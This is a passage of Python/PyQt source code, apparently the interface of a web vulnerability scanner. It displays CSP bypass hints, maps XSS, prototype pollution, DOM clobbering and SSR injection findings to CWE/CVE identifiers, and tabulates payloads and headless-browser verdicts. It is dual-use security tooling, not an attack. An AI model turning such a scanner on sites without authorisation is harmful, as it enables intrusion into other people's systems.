        elif "OFF" in msg or "error"==level: color = "#ef4444"
        elif "WARN" in msg or "warn"==level:  color = "#f59e0b"
        elif level == "debug":             color = theme("fg_muted")
        else:                              color = theme("fg")
        s = msg.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
        self.log_out.append(f'<span style="color:{color}">{s}</span>')
        self.log_out.moveCursor(QTextCursor.End)
        self.sb.showMessage(msg[:140])

    def _csp(self, r):
        try:
            score      = getattr(r, "score", 0)
            report_note= getattr(r, "report_note", "")
            raw_header = getattr(r, "raw_header", None)
            findings   = getattr(r, "findings", [])
            bypass_vecs= getattr(r, "bypass_vectors", [])
            recs       = getattr(r, "recommendations", [])

            color = "#22c55e" if score>=80 else "#f59e0b" if score>=50 else "#ff2d55"
            self.csp_score.setText(str(score))
            self.csp_score.setStyleSheet(f"font-size:42px; font-weight:bold; color:{color}; letter-spacing:2px;")
            self.csp_note.setText(str(report_note))
            self.csp_raw.setText(str(raw_header) if raw_header else "— no CSP header —")
            self.tabs.setTabText(2, f"CSP  [{score}]")

            sc = {"Critical":"#ff2d55","High":"#f59e0b","Medium":"#fbbf24","Low":"#555555","INFO":"#3b82f6"}
            for f in findings:
                row = self.csp_tbl.rowCount()
                self.csp_tbl.insertRow(row)
                sev  = getattr(f, "severity",    "")
                dire = getattr(f, "directive",   "")
                titl = getattr(f, "title",       "")
                det  = getattr(f, "detail",      "")
                byp  = getattr(f, "bypass_hint", "")
                si = QTableWidgetItem(sev);  si.setForeground(QColor(sc.get(sev,"#888")))
                di = QTableWidgetItem(dire); di.setForeground(QColor("#c8c8c8"))
                ti = QTableWidgetItem(titl); ti.setForeground(QColor("#cccccc"))
                de = QTableWidgetItem(det);  de.setForeground(QColor("#a8a8a8"))
                bi = QTableWidgetItem(byp);  bi.setForeground(QColor("#f59e0b"))
                self.csp_tbl.setItem(row,0,si); self.csp_tbl.setItem(row,1,di)
                self.csp_tbl.setItem(row,2,ti); self.csp_tbl.setItem(row,3,de)
                self.csp_tbl.setItem(row,4,bi)
            self.csp_tbl.resizeRowsToContents()

            extra_lines = []
            if bypass_vecs:
                extra_lines.append("BYPASS VEKTORY:")
                for bv in bypass_vecs: extra_lines.append(f"  • {bv}")
            if recs:
                extra_lines.append(""); extra_lines.append("RECOMMENDATIONS:")
                for rec in recs: extra_lines.append(f"  → {rec}")
            self.csp_extra.setText("\n".join(extra_lines) if extra_lines else "—")
            self.tabs.setCurrentIndex(2)
        except Exception as e:
            import traceback
            self.log_out.append(f'<span style="color:#ef4444">[CSP-ERR] {e}</span>')
            traceback.print_exc()

    # ── v10.12: CWE mapping table ────────────────────────────────────────────
    # Maps internal finding kinds to standard CWE (Common Weakness Enumeration)
    # identifiers. Used when no CVE is available (most findings) so RESULTS
    # column "CWE / CVE" always shows a meaningful identifier.
    #
    # Sources:
    #   - https://cwe.mitre.org/data/definitions/79.html (CWE-79 XSS root)
    #   - OWASP CWE Top 25 (2023)
    #   - https://cwe.mitre.org/data/definitions/1321.html (PP)
    #   - https://cwe.mitre.org/data/definitions/1275.html (DOM clobbering family)
    #
    # Reference key: matches detection context/source/kind patterns.
    # Value: (CWE id, short description).
    #
    # NOTE: when a CVE is present (DOMPurify chain, SSR CVE-2026-27902),
    # CVE takes precedence in display — CWE is only fallback.
    CWE_MAPPING = {
        # ── Classic XSS family (CWE-79) ──
        "html_body":      ("CWE-79",   "XSS (HTML body context)"),
        "script_body":    ("CWE-79",   "XSS (script context)"),
        "event_handler":  ("CWE-79",   "XSS (event handler context)"),
        "html_attr":      ("CWE-79",   "XSS (HTML attribute)"),
        "href_attr":      ("CWE-79",   "XSS (href attribute)"),
        # ── DOM-based XSS (CWE-79 subclass / CWE-83) ──
        "dom-dynamic":    ("CWE-79",   "DOM-based XSS"),
        "dom-static":     ("CWE-79",   "DOM-based XSS (static analysis)"),
        "dom-v6":         ("CWE-79",   "DOM XSS (taint chain)"),
        "static-js":      ("CWE-79",   "DOM XSS (static JS taint flow)"),
        # ── POST / form-based (still CWE-79) ──
        "POST":           ("CWE-79",   "XSS via POST parameter"),
        "JSON":           ("CWE-79",   "XSS via JSON body"),
        "HEADER":         ("CWE-79",   "XSS via HTTP header"),
        # ── Stored XSS ──
        "stored":         ("CWE-79",   "Stored XSS"),
        "stored-roundtrip": ("CWE-79", "Stored XSS (round-trip)"),
        # ── Prototype Pollution (CWE-1321) ──
        "proto-pollution":         ("CWE-1321", "Prototype Pollution"),
        "proto-pollution-chain":   ("CWE-1321", "Prototype Pollution → XSS chain"),
        "proto-pollution-cve":     ("CWE-1321", "PP → DOMPurify CVE chain"),
        # ── DOM Clobbering (CWE-1275) ──
        "dom-clobbering":          ("CWE-1275", "DOM Clobbering"),
        "dom-clobbering-chain":    ("CWE-1275", "DOM Clobbering → XSS chain"),
        # ── SSR Hydration (CWE-79, specialized) ──
        "ssr-hydration":           ("CWE-79",   "SSR Hydration XSS"),
        "ssr-hydration-cve":       ("CWE-79",   "SSR Hydration framework CVE"),
        "ssr-hydration-injection": ("CWE-79",   "SSR Hydration injection"),
        "ssr-hydration-comment-break": ("CWE-79", "SSR comment-break injection"),
        "ssr-hydration-script-break":  ("CWE-79", "SSR script-break injection"),
        # ── CSP issues (CWE-1021) ──
        "csp-bypass":              ("CWE-1021", "Improper CSP configuration"),
        "csp-bypass-unsafe-directive": ("CWE-1021", "CSP unsafe directive"),
        "csp-bypass-whitelist-jsonp":  ("CWE-1021", "CSP JSONP whitelist bypass"),
        "csp-bypass-nonce-reuse":      ("CWE-1021", "CSP nonce reuse"),
        "csp-bypass-wildcard-host":    ("CWE-1021", "CSP wildcard host"),
        "csp-bypass-css-injection":    ("CWE-1021", "CSP CSS injection"),
        "csp-bypass-meta-tag-csp":     ("CWE-1021", "CSP defined in meta tag"),
        # ── Trusted Types issues (CWE-1021 / CWE-79) ──
        "trusted-types":           ("CWE-1021", "Trusted Types CSP issue"),
        # ── Template injection (CWE-1336) ──
        "template-injection":      ("CWE-1336", "Server-side template injection"),
        # ── Mutation XSS (CWE-79 subclass) ──
        "mutation-xss":            ("CWE-79",   "Mutation XSS (mXSS)"),
        # ── postMessage / WebSocket (CWE-346 — origin validation) ──
        "postmessage":             ("CWE-346",  "Origin validation (postMessage)"),
        "websocket":               ("CWE-346",  "Origin validation (WebSocket)"),
        # ── v10.14: CORS misconfiguration ──
        "cors-misconfiguration":   ("CWE-942",  "Permissive CORS policy"),
        "cors":                    ("CWE-942",  "Permissive CORS policy"),
        # ── v10.14: CRLF injection ──
        "crlf-injection":          ("CWE-93",   "CRLF / HTTP header injection"),
        "crlf":                    ("CWE-93",   "CRLF / HTTP header injection"),
        # ── v10.14: XSSI (Cross-Site Script Inclusion) ──
        "xssi":                    ("CWE-829",  "Cross-Site Script Inclusion / JSONP exfiltration"),
        # ── v10.14: SSRF (Server-Side Request Forgery) ──
        "ssrf":                    ("CWE-918",  "Server-Side Request Forgery"),
        # ── v10.16: Path-segment + Cookie-reflected XSS (CWE-79) ──
        "path-segment":            ("CWE-79",   "Reflected XSS via URL path segment"),
        "vulnerable-library":      ("CWE-1395", "Dependency with known CVE"),
        "jsonp-callback-injection": ("CWE-79",  "XSS via JSONP callback injection"),
        "dangling-markup":          ("CWE-79",  "Scriptless HTML exfiltration (dangling markup)"),
        "svg-xml-reflection":       ("CWE-79",  "XSS via SVG/XML content-type reflection"),
        "cookie-reflected":        ("CWE-79",   "Reflected XSS via cookie value"),
        # ── Open Redirect (CWE-601) ──
        "open-redirect":           ("CWE-601",  "Open Redirect"),
        "open-redirect-server-30x":  ("CWE-601",  "Open Redirect (server 30x)"),
        "open-redirect-meta-refresh":("CWE-601",  "Open Redirect (meta refresh)"),
        "open-redirect-html-href":   ("CWE-601",  "Open Redirect (HTML href)"),
        "open-redirect-js-location": ("CWE-601",  "Open Redirect (JS location)"),
        "open-redirect-static":      ("CWE-601",  "Open Redirect (static AST)"),
    }

    def _extract_cwe_cve(self, d: dict) -> tuple:
        """Resolve CWE/CVE identifier for a finding.

        Returns (identifier, color, tooltip).
        Priority:
          1. Explicit CVE from PP / SSR findings (highest authority)
          2. CWE from context/source/finding-kind lookup
          3. "—" fallback

        Color codes by severity (matches Class column conventions).
        """
        # ── Priority 1: explicit CVE in finding dicts ──
        pp_f = d.get("proto_pollution_finding")
        ssr_f = d.get("ssr_hydration_finding")
        if pp_f and isinstance(pp_f, dict):
            cve_id = pp_f.get("cve", "") or ""
            if not cve_id:
                k = pp_f.get("kind", "") or ""
                if k.startswith("cve-"):
                    cve_id = k.upper()
            if cve_id:
                sev = pp_f.get("severity", "")
                color = {"critical": "#dc2626", "high": "#f59e0b",
                          "medium": "#eab308", "low": "#84cc16"}.get(sev, "#94a3b8")
                desc = pp_f.get("cve_description", "")
                return (cve_id, color, desc)
        if ssr_f and isinstance(ssr_f, dict):
            cve_id = ssr_f.get("cve") or ""
            if cve_id:
                sev = ssr_f.get("severity", "")
                color = {"critical": "#dc2626", "high": "#f59e0b",
                          "medium": "#eab308", "low": "#84cc16"}.get(sev, "#94a3b8")
                desc = ssr_f.get("description", "")
                return (cve_id, color, desc)

        # ── Priority 1.5: Library CVE feed (v10.13) ──
        # If the finding references a known vendor library file
        # (jquery-1.11.3.min.js etc.), surface its real CVE numbers.
        static_f = d.get("static_js_finding")
        lib_file = ""
        if static_f and isinstance(static_f, dict):
            lib_file = static_f.get("file", "") or ""
        if not lib_file:
            # Also check top-level "url" — sometimes finding points at the .js
            url_field = d.get("url", "") or ""
            if url_field.endswith(".js") or ".min.js" in url_field:
                lib_file = url_field
        if lib_file:
            try:
                from _library_cve_feed import audit_library_file
                lib_audit = audit_library_file(lib_file)
                if lib_audit and lib_audit.get("matched_cves"):
                    cves = lib_audit["matched_cves"]
                    n = len(cves)
                    first_cve = cves[0]["cve"]
                    display = f"{first_cve} +{n - 1}" if n > 1 else first_cve
                    max_sev = lib_audit.get("max_severity", "medium")
                    color = {"critical": "#dc2626", "high": "#f59e0b",
                              "medium": "#eab308", "low": "#84cc16"}.get(
                                  max_sev, "#94a3b8")
                    tip_lines = [
                        f"{lib_audit['library']} {lib_audit['version']}"
                    ]
                    for c in cves:
                        wild = (" [CISA KEV]" if c.get("exploited_in_wild")
                                else "")
                        tip_lines.append(
                            f"  {c['cve']} ({c['severity']}){wild}"
                        )
                    return (display, color, "\n".join(tip_lines))
            except ImportError:
                pass

        # ── Priority 2: CWE from finding context/source ──
        # Try context first (most specific), then source.
        ctx = (d.get("context") or "").strip()
        source = (d.get("source") or "").strip()

        # Extract base context (strip "(high)", "(medium)" suffixes)
        ctx_base = ctx.split("(")[0].strip() if "(" in ctx else ctx

        # Try exact match first, then progressive base lookups
        for key in (ctx_base, ctx, source):
            if key in self.CWE_MAPPING:
                cwe_id, desc = self.CWE_MAPPING[key]
                # v10.14 fix — postMessage/WebSocket sink-aware CWE:
                # The map paints every postmessage/websocket finding
                # with CWE-346 (origin validation). That's WRONG when
                # the handler actually sinks tainted data into Function()/
                # eval (= CWE-95 Eval Injection) or into innerHTML /
                # document.write (= CWE-79 DOM-XSS). CWE-346 fits ONLY
                # when the sole issue is a missing origin check.
                if key in ("postmessage", "websocket"):
                    pm_f = (d.get("postmessage_finding")
                            or d.get("websocket_finding") or {})
                    if isinstance(pm_f, dict):
                        sink = (pm_f.get("sink_type")
                                or pm_f.get("sink") or "").lower()
                        eval_sinks = (
                            "function(", "function (", "eval(",
                            "settimeout", "setinterval",
                        )
                        dom_sinks = (
                            "innerhtml", "outerhtml",
                            "document.write", "writeln",
                            "insertadjacenthtml",
                            ".html(", ".append(", ".prepend(",
                        )
                        if any(s in sink for s in eval_sinks):
                            return (
                                "CWE-95",
                                "#94a3b8",
                                f"Eval Injection via {key} "
                                f"(sink: {sink or '?'}) "
                                f"— Function/eval/setTimeout(string) "
                                f"with attacker-controlled data",
                            )
                        if any(s in sink for s in dom_sinks):
                            return (
                                "CWE-79",
                                "#94a3b8",
                                f"DOM-XSS via {key} "
                                f"(sink: {sink or '?'})",
                            )
                # Default mapping (origin check only / unclassified sink)
                return (cwe_id, "#94a3b8", desc)

        # Try prefix match — e.g. "static-js-taint" matches "static-js"
        for key, (cwe_id, desc) in self.CWE_MAPPING.items():
            if ctx_base.startswith(key) or source.startswith(key):
                # Same sink-aware override as in the exact-match path
                # above — covers source="postmessage-static" /
                # "postmessage-dynamic" which hit this branch.
                if key in ("postmessage", "websocket"):
                    pm_f = (d.get("postmessage_finding")
                            or d.get("websocket_finding") or {})
                    if isinstance(pm_f, dict):
                        sink = (pm_f.get("sink_type")
                                or pm_f.get("sink") or "").lower()
                        eval_sinks = (
                            "function(", "function (", "eval(",
                            "settimeout", "setinterval",
                        )
                        dom_sinks = (
                            "innerhtml", "outerhtml",
                            "document.write", "writeln",
                            "insertadjacenthtml",
                            ".html(", ".append(", ".prepend(",
                        )
                        if any(s in sink for s in eval_sinks):
                            return (
                                "CWE-95",
                                "#94a3b8",
                                f"Eval Injection via {key} "
                                f"(sink: {sink or '?'}) "
                                f"— Function/eval/setTimeout(string) "
                                f"with attacker-controlled data",
                            )
                        if any(s in sink for s in dom_sinks):
                            return (
                                "CWE-79",
                                "#94a3b8",
                                f"DOM-XSS via {key} "
                                f"(sink: {sink or '?'})",
                            )
                return (cwe_id, "#94a3b8", desc)

        # ── No match: gray dash ──
        return ("—", "#555555", "")

    def _apply_row_tint(self, tbl, row, sev):
        """v10.81: subtly tint an entire result row by severity so the dense
        many-column table is triage-scannable at a glance (works regardless of
        column order / horizontal scroll position)."""
        s = (sev or "").lower()
        tint = {
            "critical": QColor(239, 68, 68, 50),
            "high":     QColor(249, 115, 22, 42),
            "medium":   QColor(245, 158, 11, 30),
            "low":      QColor(100, 116, 139, 20),
            "info":     QColor(100, 116, 139, 12),
        }.get(s)
        if tint is None:
            return
        try:
            for c in range(tbl.columnCount()):
                it = tbl.item(row, c)
                if it is not None:
                    it.setBackground(tint)
        except Exception:
            pass

    def _hit(self, d):
        self.hit_count += 1
        try:
            self._collected_hits.append(dict(d))  # keep raw dict for Save/export
        except Exception:
            pass
        # FINDINGS tile = TOTAL findings (RESULTS rows + LIBRARY AUDIT rows). The
        # RESULTS-tab label is set from the actual table rowCount further below,
        # AFTER the library-audit early-return, so vendor findings routed to the
        # LIBRARY AUDIT tab don't inflate RESULTS or trigger the auto-switch.
        self._c_hits._val.setText(str(self.hit_count))

        ctx = d.get("context", "")
        ctx_colors = {
            "script_body":   "#ff2d55",
            "event_handler": "#ff2d55",
            "href_attr":     "#f59e0b",
            "html_attr":     "#fbbf24",
            "html_body":     "#aaaaaa",
            "POST":          "#3b82f6",
            "JSON":          "#8b5cf6",
            "HEADER":        "#22c55e",
        }

        # ── v3 GATE klasifikace barvy ──
        gate_klass = d.get("gate_klass", "") or ""
        gate_sev = d.get("gate_severity", "") or ""
        klass_label = ""
        klass_color = "#666666"

        # ── v4-v8: nejvyšší prioritu mají specializované třídy zranitelností
        # (template injection, mXSS, DOM v6 chain, static JS, trusted types) —
        # jsou nezávislé na běžném context-engine verdiktu a mají vlastní severity.
        ti = d.get("template_injection")
        mxss = d.get("mxss_finding")
        dom_v6 = d.get("dom_v6_finding")
        static_js = d.get("static_js_finding")
        trusted_types = d.get("trusted_types_finding")
        stored_rt = d.get("stored_roundtrip_finding")
        proto_pp = d.get("proto_pollution_finding")
        dom_clob = d.get("dom_clobbering_finding")
        ssr_hydration_f = d.get("ssr_hydration_finding")
        csp_bypass_f = d.get("csp_bypass_finding")
        source = d.get("source", "") or ""

        if ti and isinstance(ti, dict):
            # Template injection — eval engine = critical
            fw = ti.get("framework", "?")
            klass_label = f"TI:{fw[:6]}"
            klass_color = "#a855f7"   # fialová — eval engine
        elif proto_pp and isinstance(proto_pp, dict):
            # PP→XSS chain — v10.10: any CVE kind (cve-2024-47875, cve-2025-26791,
            # cve-2026-41238, future). Klass label shows specific CVE number.
            kind = proto_pp.get("kind", "")
            sev = proto_pp.get("severity", "")
            if kind.startswith("cve-"):
                # Extract CVE short number from kind: "cve-2026-41238" → "41238"
                # or fall back to "CVE" if format unexpected.
                cve_short = kind.split("-")[-1] if "-" in kind else kind
                klass_label = f"PP:CVE-{cve_short}"
                klass_color = "#7c2d12"   # tmavě hnědá — known CVE chain
            else:
                klass_label = "PP:chain"
                if sev == "high":
                    klass_color = "#b91c1c"   # červená — chain
                else:
                    klass_color = "#dc2626"
        elif source == "proto-pollution":
            klass_label = "PP"
            klass_color = "#b91c1c"
        elif dom_clob and isinstance(dom_clob, dict):
            # DOM Clobbering chain (Intigriti 2026) — sanitizer + sink chain
            klass_label = "DC:chain"
            klass_color = "#9333ea"   # fialová — modern sanitizer-bypass chain
        elif source == "dom-clobbering":
            klass_label = "DC"
            klass_color = "#9333ea"
        elif ssr_hydration_f and isinstance(ssr_hydration_f, dict):
            # SSR Hydration XSS — CVE-2026-27902 family
            kind = ssr_hydration_f.get("kind", "")
            cve_id = ssr_hydration_f.get("cve") or ""
            if kind == "framework-cve":
                if cve_id == "CVE-2026-27902":
                    klass_label = "SSR:CVE-27902"
                    klass_color = "#7c2d12"   # tmavě hnědá — known critical CVE
                else:
                    klass_label = f"SSR:{cve_id[-5:]}" if cve_id else "SSR:CVE"
                    klass_color = "#b91c1c"
            elif kind == "comment-break":
                klass_label = "SSR:cmt-brk"
                klass_color = "#dc2626"   # červená — comment break exploit
            elif kind == "script-break":
                klass_label = "SSR:scr-brk"
                klass_color = "#dc2626"
            elif kind == "reflected-in-hydration":
                klass_label = "SSR:reflected"
                klass_color = "#ea580c"   # oranžová — pre-hydration reflection
            else:
                klass_label = "SSR"
                klass_color = "#ea580c"
        elif source == "ssr-hydration":
            klass_label = "SSR"
            klass_color = "#ea580c"
        elif csp_bypass_f and isinstance(csp_bypass_f, dict):
            # CSP Bypass — 6 sub-layers, severity-driven
            layer = csp_bypass_f.get("layer", "")
            sev = csp_bypass_f.get("severity", "medium")
            label_map = {
                "whitelist-jsonp":  "CSP:JSONP",
                "unsafe-directive": "CSP:unsafe",
                "nonce-reuse":      "CSP:nonce-RU",
                "meta-tag-csp":     "CSP:meta",
                "wildcard-host":    "CSP:wild",
                "css-injection":    "CSP:CSS-inj",
            }
            klass_label = label_map.get(layer, "CSP")
            color_map = {
                "critical": "#0e7490",   # dark teal — critical CSP issue
                "high":     "#0891b2",   # teal — high CSP issue
                "medium":   "#06b6d4",   # cyan — medium CSP issue
                "low":      "#67e8f9",   # light cyan — low
            }
            klass_color = color_map.get(sev, "#0891b2")
        elif source == "csp-bypass":
            klass_label = "CSP"
            klass_color = "#0891b2"
        elif stored_rt and isinstance(stored_rt, dict):
            # Stored XSS round-trip — admin context = critical, public = high
            if stored_rt.get("is_admin_context"):
                klass_label = "STORED:admin"
                klass_color = "#dc2626"   # tmavě červená — admin compromise
            else:
                klass_label = "STORED"
                klass_color = "#ec4899"   # růžová — stored persistence
        elif source == "stored-roundtrip":
            klass_label = "STORED"
            klass_color = "#ec4899"
        elif trusted_types and isinstance(trusted_types, dict):
            # TT misconfig — silent backdoor patterns
            kind = trusted_types.get("kind", "")
            sev = trusted_types.get("severity", "")
            if kind == "policy":
                pname = trusted_types.get("policy_name", "?")
                if trusted_types.get("is_default"):
                    klass_label = "TT:default!"   # silent backdoor
                else:
                    klass_label = f"TT:{pname[:8]}"
            else:
                klass_label = "TT:CSP"
            if sev == "critical":
                klass_color = "#7c2d12"   # tmavě hnědá — silent backdoor
            elif sev == "high":
                klass_color = "#d97706"   # amber-tmavá
            elif sev == "medium":
                klass_color = "#f59e0b"   # amber
            else:
                klass_color = "#94a3b8"
        elif source == "trusted-types":
            klass_label = "TT"
            klass_color = "#d97706"
        elif static_js and isinstance(static_js, dict):
            # Static JS taint chain — typed by sink severity
            sink = static_js.get("sink", "?")
            sev = static_js.get("severity", "")
            klass_label = f"JS:{sink[:8]}"
            if sev == "critical":
                klass_color = "#dc2626"   # tmavě červená — eval/Function
            elif sev == "high":
                klass_color = "#0891b2"   # teal — innerHTML/document.write
            else:
                klass_color = "#94a3b8"
        elif dom_v6 and isinstance(dom_v6, dict):
            # DOM v6 runtime taint chain
            chains = dom_v6.get("chain_count", 0)
            label_str = dom_v6.get("label", "")
            if chains > 0:
                klass_label = "DOM-V6:chain"
            else:
                klass_label = f"DOM-V6"
            klass_color = "#0d9488"   # tmavší teal — runtime confirmed
        elif source == "dom-v6":
            klass_label = "DOM-V6"
            klass_color = "#0d9488"
        elif source == "static-js":
            klass_label = "JS"
            klass_color = "#0891b2"
        elif mxss and isinstance(mxss, dict):
            # mXSS — sanitizer + innerHTML pattern
            san = mxss.get("sanitizer", "?")
            klass_label = f"mXSS:{san[:6]}"
            klass_color = "#ec4899"   # růžová — bypass kandidát
        elif source == "mutation-xss-static":
            klass_label = "mXSS"
            klass_color = "#ec4899"
        elif gate_klass == "xss_executable":
            klass_label = "XSS"
            klass_color = "#ef4444"   # červená
        elif gate_klass == "tag_injection":
            klass_label = "TAG"
            klass_color = "#f97316"   # oranžová
        elif gate_klass == "text_only":
            klass_label = "TEXT"
            klass_color = "#94a3b8"   # šedá
        elif d.get("dom_verified"):
            klass_label = "DOM✓"
            klass_color = "#10b981"   # zelená
        elif gate_klass == "unknown":
            klass_label = "?"
            klass_color = "#666666"
        # Sufix severity, pokud máme — přeskoč pro specializované třídy
        # (mají vlastní severity z findingu)
        skip_severity_suffix = bool(ti or mxss or dom_v6 or static_js
                                     or trusted_types or stored_rt or proto_pp
                                     or dom_clob or ssr_hydration_f or csp_bypass_f
                                     or source in ("dom-v6", "static-js",
                                                    "trusted-types",
                                                    "stored-roundtrip",
                                                    "proto-pollution",
                                                    "dom-clobbering",
                                                    "ssr-hydration",
                                                    "csp-bypass"))
        if klass_label and gate_sev and not skip_severity_suffix:
            # Template/mXSS labels už mají vlastní význam — nepřidávej sev
            sev_short = gate_sev[:4]
            klass_label = f"{klass_label}/{sev_short}"

        # ── Render probe ikona ──
        # v5: headless verifier verdict má nejvyšší prioritu (definitivní
        # ground truth z reálného Chromium). Pokud chybí, fallback na active
        # render probe verdict z v3.
        probe_label = ""
        probe_color = "#666666"
        probe_tooltip = ""

        headless_verdict = d.get("headless_verdict", "") or ""
        headless_executed = bool(d.get("headless_executed", False))
        headless_method = d.get("headless_method", "") or ""
        headless_evidence = d.get("headless_evidence", "") or ""

        if headless_verdict == "executed":
            # Chromium definitivně potvrdilo exec — nejvyšší confidence
            probe_label = "🚨 BROWSER"
            probe_color = "#dc2626"   # tmavě červená — nejvyšší impact
            probe_tooltip = (f"Chromium confirmed JS execution\n"
                             f"method: {headless_method}\n"
                             f"evidence: {headless_evidence[:100]}")
        elif headless_verdict == "not_executed":
            # Chromium otevřelo, neexekvuje — definitivní FP
            probe_label = "✗ browser"
            probe_color = "#94a3b8"   # šedá — definitivně FP
            probe_tooltip = "Chromium opened the URL, no dialog/console exec — likely FP"
        elif headless_verdict == "error":
            probe_label = "?browser"
            probe_color = "#f59e0b"   # amber — inconclusive
            probe_tooltip = "Headless verifikace selhala"
        else:
            # Bez headless verdict — fallback na v3 active render probe
            probe = d.get("render_probe", "") or ""
            probe_tooltip = d.get("render_probe_reason", "") or ""
            if probe == "executable":
                probe_label = "✓"
                probe_color = "#10b981"
            elif probe == "inert":
                probe_label = "✗"
                probe_color = "#ef4444"
            elif probe == "skipped":
                probe_label = "—"
                probe_color = "#666666"

        # ── v10.8: Library Audit routing ──
        # If this is a static-js finding from vendor library code, route it
        # to the Library Audit tab instead of polluting RESULTS.
        # ── v10.9: Same logic now applies to PP findings — vendor jQuery / lodash
        # PP gadgets are supply chain audit material, not app bugs ──
        sjs = d.get("static_js_finding")
        pp_lib = d.get("proto_pollution_finding")
        is_static_js_lib = (sjs and isinstance(sjs, dict)
                             and sjs.get("library_audit"))
        is_pp_lib = (pp_lib and isinstance(pp_lib, dict)
                      and pp_lib.get("library_audit"))
        if is_static_js_lib or is_pp_lib:
            # Pass appropriate finding dict to renderer (it accepts either)
            finding_for_row = sjs if is_static_js_lib else pp_lib
            self._add_library_audit_row(d, finding_for_row)
            # Update LIBRARY AUDIT tab counter
            try:
                lib_count = self.lib_tbl.rowCount()
                self.tabs.setTabText(self._tab_idx_library_audit,
                                       f"LIBRARY AUDIT  [{lib_count}]")
            except Exception:
                pass
            return  # do NOT add to RESULTS

        row = self._res_tbl_new_row()

        def cell(text, color="#cccccc", tooltip=None):
            item = QTableWidgetItem(str(text))
            item.setForeground(QColor(color))
            if tooltip:
                item.setToolTip(str(tooltip))
            return item

        # Zkrátit URL pro zobrazení ale tooltipu dát plnou
        url_full = d.get("url", "")
        url_item = QTableWidgetItem(url_full)
        url_item.setForeground(QColor("#cccccc"))
        url_item.setToolTip(url_full)

        ctx_color = ctx_colors.get(ctx, "#aaaaaa")

        waf_v = d.get("waf","")
        waf_s = waf_v.get("name","") if isinstance(waf_v, dict) else str(waf_v)
        pl_item = cell(d.get("payload",""), "#666666")
        pl_item.setToolTip(d.get("payload",""))

        # 11 sloupců (v10.11+): URL | Param | Kontext | Klasa | CVE | Probe | Zdroj | Status | WAF | CSP | Payload
        # Tooltip pro Klasa: full gate_renderability + content-type
        klass_tooltip = ""
        if d.get("gate_renderability") or d.get("gate_content_type"):
            klass_tooltip = (f"renderability: {d.get('gate_renderability','?')}\n"
                             f"content-type:  {d.get('gate_content_type','?')}")

        # v10.12: Resolve CWE/CVE identifier — CVE if known vulnerability,
        # CWE otherwise. Falls back to "—" only when neither applies.
        cve_id, cve_color, cve_tooltip = self._extract_cwe_cve(d)

        self.res_tbl.setItem(row, 0,  url_item)
        self.res_tbl.setItem(row, 1,  cell(d.get("param", ""),      "#e0e0e0"))
        self.res_tbl.setItem(row, 2,  cell(ctx,                     ctx_color))
        self.res_tbl.setItem(row, 3,  cell(klass_label,             klass_color, tooltip=klass_tooltip))
        self.res_tbl.setItem(row, 4,  cell(cve_id,                  cve_color,   tooltip=cve_tooltip))
        self.res_tbl.setItem(row, 5,  cell(probe_label,             probe_color, tooltip=probe_tooltip))
        self.res_tbl.setItem(row, 6,  cell(d.get("source","seed"),  "#666666"))
        self.res_tbl.setItem(row, 7,  cell(d.get("status",""),      "#555555"))
        self.res_tbl.setItem(row, 8,  cell(waf_s,                   "#3b82f6"))
        self.res_tbl.setItem(row, 9,  cell(d.get("csp_note",""),    "#888888"))
        self.res_tbl.setItem(row, 10, pl_item)
        self._apply_row_tint(self.res_tbl, row,
                             d.get("gate_severity") or d.get("severity"))

        # v10.80: RESULTS tab label reflects ACTUAL res_tbl rows (library-audit
        # findings live in the LIBRARY AUDIT tab and must not count here).
        self.tabs.setTabText(3, f"RESULTS  [{self.res_tbl.rowCount()}]")
        # Přepni na tab výsledků při PRVNÍM skutečném RESULTS řádku — ne při
        # library-audit nálezu (jinak skok na prázdnou tabulku).
        if self.res_tbl.rowCount() == 1:
            self.tabs.setCurrentIndex(3)

        # Attack graph — pulzující HIT node + uložit plné details pro click
        if hasattr(self, '_attack_graph'):
            try:
                from urllib.parse import urlparse as _up
                parsed = _up(url_full)
                hit_path = parsed.path or "/"
                hit_param = d.get("param", "") or "?"
                # Plné details pro click handler — vše co máme o tomhle hitu
                # Zahrnuje gate_* pole, takže attack graph může barvit uzly
                # podle XSS_executable / tag_injection / text_only.
                hit_details = {
                    "url":      url_full,
                    "param":    d.get("param", ""),
                    "path":     hit_path,
                    "payload":  d.get("payload", ""),
                    "context":  d.get("context", ""),
                    "source":   d.get("source", "seed"),
                    "status":   d.get("status", ""),
                    "waf":      d.get("waf", ""),
                    "csp_note": d.get("csp_note", ""),
                    # ── v2 GATE annotations propagated to graph ──
                    "gate_klass":         d.get("gate_klass", ""),
                    "gate_severity":      d.get("gate_severity", ""),
                    "gate_renderability": d.get("gate_renderability", ""),
                    "gate_content_type":  d.get("gate_content_type", ""),
                    "gate_verdict":       d.get("gate_verdict"),
                    # ── v3 active probe ──
                    "render_probe":       d.get("render_probe", ""),
                    "render_probe_reason":d.get("render_probe_reason", ""),
                    "dom_verified":       d.get("dom_verified", False),
                    # ── v4: template injection + mutation XSS ──
                    "template_injection": d.get("template_injection"),
                    "mxss_finding":       d.get("mxss_finding"),
                    # ── v5: headless verifier ──
                    "headless_verdict":   d.get("headless_verdict", ""),
                    "headless_executed":  d.get("headless_executed", False),
                    "headless_method":    d.get("headless_method", ""),
                    "headless_evidence":  d.get("headless_evidence", ""),
                    # ── v6: DOM taint analysis ──
                    "dom_v6_finding":     d.get("dom_v6_finding"),
                    # ── v7: Static JS analyzer ──
                    "static_js_finding":  d.get("static_js_finding"),
                    # ── v8: Trusted Types analyzer ──
                    # Set when source="trusted-types" — CSP misconfig or
                    # insecure createPolicy() definition found in JS.
                    "trusted_types_finding": d.get("trusted_types_finding"),
                    # ── v9: Stored XSS round-trip ──
                    # Set when source="stored-roundtrip" — multi-canary stored
                    # XSS detected via re-crawl phase.
                    "stored_roundtrip_finding": d.get("stored_roundtrip_finding"),
                    # ── v10: Prototype Pollution → XSS chain ──
                    # Set when source="proto-pollution" — PP source+gadget chain
                    # or PP source + vulnerable DOMPurify (CVE-2026-41238).
                    "proto_pollution_finding": d.get("proto_pollution_finding"),
                    # ── v10.4: DOM Clobbering → XSS chain ──
                    # Set when source="dom-clobbering" — sanitizer issue +
                    # clobberable sink in same page (Intigriti 2026 pattern).
                    "dom_clobbering_finding": d.get("dom_clobbering_finding"),
                    # ── v10.5: SSR Hydration XSS (CVE-2026-27902) ──
                    # Set when source="ssr-hydration" — framework-cve, comment-break,
                    # script-break, or reflected-in-hydration finding.
                    "ssr_hydration_finding": d.get("ssr_hydration_finding"),
                    # ── v10.6: CSP Bypass Detection (94.72% bypassable) ──
                    # Set when source="csp-bypass" — whitelist-jsonp, unsafe-directive,
